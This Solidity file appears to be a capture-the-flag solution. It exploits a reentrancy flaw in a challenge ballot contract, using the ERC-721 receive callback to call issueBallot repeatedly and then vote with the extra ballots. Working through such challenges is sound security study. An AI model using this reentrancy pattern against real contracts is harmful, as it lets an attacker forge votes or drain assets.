// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Setup} from "./challenge/Setup.sol";

contract Exploit {
    Setup setup;
    uint256 count = 0;

    constructor(address setupAddr) {
        setup = Setup(setupAddr);
        setup.register();
    }

    function exploit() public {
        setup.ballot().issueBallot();

        for (uint256 i = 0; i < count; i++) {
            setup.ballot().voteForCandidate(i + 1, address(setup));
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        count += 1;
        if (count < 10) {
            setup.ballot().issueBallot();
        }
        return this.onERC721Received.selector;
    }
}
